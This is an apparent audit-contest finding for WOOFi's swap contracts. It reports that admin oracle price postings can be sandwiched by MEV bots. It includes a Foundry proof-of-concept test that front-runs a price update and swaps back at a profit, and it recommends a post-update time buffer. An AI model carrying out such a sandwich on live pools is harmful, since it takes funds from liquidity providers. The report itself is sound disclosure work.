Icy Denim Cougar

high

# Oracle price updates can be easily sandwiched for atomic profits

## Summary
When the new price is posted by admin to oracle, any MEV searcher can frontrun/sandwich for atomic profits. Such sandwich would mean loss of funds for the supplier of the tokens.
## Vulnerability Detail
Assume USDC is quote token and WOO is base token. WOO does not have a chainlink price feed which means the pricing of WOO will be handled by the WooOracle solely. 

Also assume that the WOO price is 0.5$. However, in off-chain markets, the price of WOO increases to 0.55$ and the oracle is updated by the admin so the oracle update will make the onchain price 0.5$ -> 0.55$.

MEV bot sees the oracle price update tx in mempool, and quickly buys WOO tokens from the pool contract and then sells it for more USDC after the oracle update is completed. At the end, MEV bot achieved to buy WOO tokens from 0.5$ and managed to sell all for 0.55$ in 1 tx. The profit that the MEV bot made is basically a loss to the provider of the WOO tokens in the pool since the WOO tokens are sold to a price that is cheaper than it should be. 

**Coded PoC:**
```solidity
function test_frontrunOraclePriceUpdate() public {
        uint usdcAmount = 1_000_000 * 1e6;
        uint wooAmount = 100_000 * 1e18;
        deal(USDC, ADMIN, usdcAmount);
        deal(WOO, ADMIN, wooAmount);

        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WOO).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WOO);
        vm.stopPrank();

        assertEq(IERC20(USDC).balanceOf(address(pool)), usdcAmount);

        uint usdcAmountForTapir = 10_000 * 1e6;
        vm.startPrank(TAPIR);
        deal(USDC, TAPIR, usdcAmountForTapir);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WOO).approve(address(router), type(uint256).max);
        vm.stopPrank();

        // sell USDC for WOO before price update, frontrun, initial price is 0.5
        vm.prank(TAPIR);
        uint receivedWOO = router.swap(USDC, WOO, usdcAmountForTapir, 0, payable(TAPIR), TAPIR);
        console.log("Received WOO", receivedWOO);

        // new price is updated, 0.55
        vm.prank(ADMIN);
        oracle.postPrice(WOO, 0.55 * 1e8);

        // immediately sell back 
        vm.prank(TAPIR);
        uint receivedUSDC = router.swap(WOO, USDC, receivedWOO, 0, payable(TAPIR), TAPIR);
        console.log("Received USDC", receivedUSDC);

        // atomic profit
        assertGe(receivedUSDC, usdcAmountForTapir);
    }
```
## Impact

## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/wooracle/WooracleV2_2.sol#L148-L156
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L152-L170
## Tool used

Manual Review

## Recommendation
Add a buffer that whenever the price is updated the buffer amount of time has to be passed.
If the oracle updates at t=0, and buffer is 2seconds then the next swap can happen in t=2 to make sure sandwiching is not possible for MEV bots 